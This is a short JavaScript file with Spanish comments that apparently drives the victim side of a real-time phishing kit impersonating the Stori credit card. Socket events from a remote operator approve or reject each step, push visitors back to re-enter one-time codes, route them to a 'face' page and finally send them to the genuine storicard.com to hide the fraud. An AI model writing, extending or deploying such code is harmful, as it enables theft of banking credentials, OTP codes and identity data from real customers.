const socket = io();
const sessionId = localStorage.getItem("sessionId");

// Escucha la respuesta general de acceso desde index.html
socket.on("respuesta", (decision) => {
  if (decision === "aprobado") {
    window.location.href = "bienvenido.html";
  } else if (decision === "rechazado") {
    window.location.href = "errorlogo.html";
  }
});

// Escucha la respuesta del código enviado desde bienvenido.html
socket.on("respuestaCodigo", (decision) => {
  if (decision === "error") {
    window.location.href = "denegado.html";
  } else if (decision === "finalizar") {
    window.location.href = "https://www.storicard.com/";
  }
});

// Escucha la respuesta del OTP reingresado desde denegado.html
socket.on("respuestaOtp", (decision) => {
  if (decision === "otp_error") {
    window.location.href = "denegado.html";
  } else if (decision === "finalizar") {
    window.location.href = "https://www.storicard.com/";
  }
});

// Escucha la respuesta del formulario reenviado desde errorlogo.html
socket.on("respuestaErrorLogo", (decision) => {
  if (decision === "otp") {
    window.location.href = "bienvenido.html";
  } else if (decision === "error_logo") {
    window.location.href = "errorlogo.html";
  }
});

// Agregar la acción para el botón "TC"
const tcButton = document.getElementById("tcButton");
if (tcButton) {
  tcButton.addEventListener("click", () => {
    console.log("Botón TC presionado, emitiendo acción...");

    // Emitir un evento 'accionTC' al servidor
    socket.emit("accionTC", { sessionId });

    // Verificar que la redirección está siendo ejecutada
    console.log("Redirigiendo a face.html...");
    
    // Intentar redirigir a face.html
    setTimeout(() => {
      window.location.href = "face.html";
    }, 100); // Intentar con un pequeño retraso para asegurar que se ejecute correctamente
  });
}
